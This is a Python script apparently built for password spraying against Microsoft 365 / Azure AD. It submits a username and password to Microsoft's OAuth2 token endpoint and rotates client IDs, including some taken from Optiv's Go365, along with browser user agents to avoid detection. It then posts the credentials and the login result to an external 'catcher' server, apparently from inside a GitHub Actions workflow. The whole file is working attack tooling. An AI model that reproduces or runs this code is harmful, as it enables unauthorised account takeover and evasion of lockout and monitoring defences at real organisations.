import requests, random
import os
from urllib3.exceptions import InsecureRequestWarning
import uuid

required_env_vars = {"USERNAME", "PASSWORD", "CATCHERURL", "CATCHERTLS"}
env_vars = {var: os.getenv(var) for var in required_env_vars}

missing_env_vars = [var for var, value in env_vars.items() if value is None]
if missing_env_vars:
    missing_vars_str = ", ".join(missing_env_vars)
    raise ValueError(f"Missing environment variables: {missing_vars_str}")

username = env_vars["USERNAME"]
password = env_vars["PASSWORD"]
catcher_URL = env_vars["CATCHERURL"]
catcher_uses_TLS = env_vars["CATCHERTLS"].lower() == "true"


#client_ids = [
#        "4345a7b9-9a63-4910-a426-35363201d503", # alternate client_id taken from Optiv's Go365
#        "1b730954-1685-4b74-9bfd-dac224a7b894",
#        "0a7bdc5c-7b57-40be-9939-d4c5fc7cd417",
#        "1950a258-227b-4e31-a9cf-717495945fc2",
#        "00000002-0000-0000-c000-000000000000",
#        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
#        "30cad7ca-797c-4dba-81f6-8b01f6371013"
#    ]


client_ids = [
    "bc59ab01-8403-45c6-8796-ac3ef710b3e3",
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "57fb890c-0dab-4253-a5e0-7188c88b2bb4",
    "1b730954-1685-4b74-9bfd-dac224a7b894",
    "00000002-0000-0000-c000-000000000000",
    "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
    "c7e126a0-c6a6-45c5-b7e2-d81b7fab7f42",
    "e48d4214-364e-4731-b2b6-47dabf529218",
    "9c5e57a3-93dd-4b4a-80d4-b7b35e3b2b0e",
    "00000003-0000-0ff1-ce00-000000000000",
    "f8a3e5d8-82a0-4b75-90cc-6b986f3d6b9c",
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "a0c73c16-a7e3-4564-9a95-2bdf47383716",
    "bc024368-1153-4739-b217-4326f2e966d0",
    "797f4846-ba00-4fd7-ba43-dac1f8f63013",
    "00000009-0000-0000-c000-000000000000"
]
client_id = random.choice(client_ids)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
]
user_agent = random.choice(user_agents)

def send_login_request():
    url = "https://login.microsoft.com/common/oauth2/token"
    body_params = {
        "resource": "https://graph.windows.net",
        "client_id": client_id,
        "client_info": "1",
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid",
    }
    post_headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": user_agent,
    }

    try:
        response = requests.post(
            url,
            headers=post_headers,
            data=body_params,
            timeout=5,
        )
        return response.status_code, response.text
    
    except requests.exceptions.Timeout:
        return None, "Timeout occurred"
    except requests.exceptions.ConnectionError:
        return None, "Connection error"
    except requests.RequestException:
        return None, "Seeing something I don't understand"


def send_data_to_catcher(data, use_ssl):
    if not use_ssl:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
        print(f"[+] Data sent to the catcher. Status Code: {response.status_code}")
    except requests.RequestException:
        print(f"[-] Failed to send data to the catcher. Status Code: {response.status_code}")


login_response_code, login_response = send_login_request()


data = {
    "username": username,
    "password": password,
}

if login_response_code is not None and login_response is not None:
    data["status_code"] = login_response_code
    data["response"] = login_response
else:
    data["status_code"] = 500
    data["response"] = "Github actions workflow failed to perform login request"

send_data_to_catcher(data, use_ssl=catcher_uses_TLS)
